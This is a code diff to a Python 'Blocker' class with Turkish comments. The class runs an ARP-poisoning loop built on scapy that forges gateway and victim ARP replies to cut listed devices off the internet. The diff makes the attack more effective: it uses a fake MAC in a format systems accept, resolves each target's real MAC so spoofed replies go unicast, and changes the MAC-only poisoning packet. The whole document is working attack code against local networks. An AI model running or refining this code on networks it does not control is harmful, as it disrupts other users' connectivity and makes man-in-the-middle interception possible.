@@ -64,7 +64,8 @@ class Blocker:
 
     def _arp_poison_worker(self):
         """Ağdaki engellenen cihazların internetini kesmek için sürekli sahte ARP gönderir."""
-        dummy_mac = "00:00:00:00:00:00"
+        # '00:00:00:00:00:00' bazı sistemlerce reddedilir. Geçerli formatta sahte MAC:
+        dummy_mac = "02:00:00:00:00:00"
         
         while self.running:
             if not self.gateway_ip:
@@ -77,18 +78,23 @@ class Blocker:
             if self.gateway_ip and (ips_to_poison or macs_to_poison):
                 for target_ip in ips_to_poison:
                     try:
+                        target_mac = getmacbyip(target_ip)
+                        if not target_mac:
+                            target_mac = "ff:ff:ff:ff:ff:ff"
+                            
                         # Kurbana: Ağ geçidi sahte MAC'te (İnterneti keser)
-                        sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=self.gateway_ip, hwsrc=dummy_mac), iface=self.interface, verbose=False)
+                        sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=dummy_mac), iface=self.interface, verbose=False)
                         # Ağ geçidine: Kurban sahte MAC'te (Router'dan yanıt almasını engeller)
                         if self.gateway_mac:
                             sendp(Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip, hwsrc=dummy_mac), iface=self.interface, verbose=False)
-                    except Exception:
+                    except Exception as e:
                         pass
                         
                 for target_mac in macs_to_poison:
                     try:
-                        # Sadece MAC biliniyorsa Broadcast ile kurbana sahte ağ geçidi anonsu yap
-                        sendp(Ether(dst=target_mac)/ARP(op=2, pdst="255.255.255.255", hwdst=target_mac, psrc=self.gateway_ip, hwsrc=dummy_mac), iface=self.interface, verbose=False)
+                        if target_mac and target_mac != "ff:ff:ff:ff:ff:ff":
+                            # MAC tabanlı izolasyon
+                            sendp(Ether(dst=target_mac)/ARP(op=2, pdst="0.0.0.0", hwdst=target_mac, psrc=self.gateway_ip, hwsrc=dummy_mac), iface=self.interface, verbose=False)
                     except Exception:
                         pass
             
